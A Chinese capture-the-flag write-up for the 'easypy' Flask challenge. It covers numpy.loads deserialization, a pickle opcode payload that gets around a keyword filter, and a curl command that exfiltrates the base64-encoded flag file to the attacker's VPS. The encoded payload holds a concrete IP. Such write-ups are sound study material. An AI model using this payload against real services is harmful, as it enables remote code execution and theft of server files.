# easypy

> 分类：Web

## 题目描述

Flask 应用，扫描目录得到 `/download` 下载 `www.zip`，真正的代码在 `app.cpython-38.pyc`，反编译后发现 `/girlfriends?data=` 路由使用 numpy 反序列化（`numpy.loads`）。

## 考察知识点

- numpy 反序列化 RCE
- python pickle opcode 构造
- 无回显 RCE（curl 外带）

## 解法

反编译 `app.cpython-38.pyc` 得到源码，核心逻辑：

```python
def girlfriends():
    if request.values.get('data'):
        data = request.values.get('data')
        numpydata = base64.b64decode(data)
        if b'R' in numpydata and b'bash' in numpydata or b'sh' in numpydata:
            return '不能走捷径啊'
        resp = numpy.loads(numpydata)  # numpy 反序列化
        return '可以的，要的就是一种感觉'
```

路由 `/girlfriends?data=` 需提供 opcode 实现 RCE，但不能包含 `R` 字符（禁用 `REDUCE`），也不能包含 `bash`/`sh`。可用 `i`（INST）或 `o`（OBJ）字符实现 RCE。反弹 shell 不好实现（禁用 sh），用 curl 外带 flag：

```python
b'''(S'curl http://<vps>:10010?`base64 /flag`'
ios
system
.'''
```

对应 base64：`KFMnY3VybCBodHRwOi8vMTIwLjI1LjEwNC4yMDk6MTAwMTA/YGJhc2U2NCAvZmxhZ2AnCmlvcwpzeXN0ZW0KLg==`

vps 端用 `python3 -m http.server 10010` 接收 flag。

## 参考答案

（flag 通过 numpy 反序列化 RCE + curl 外带）

## 来源

- 作者：Lazzaro | https://lazzzaro.github.io/2023/05/19/match-2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B-%E6%98%A5%E5%AD%A3%E8%B5%9B/index.html
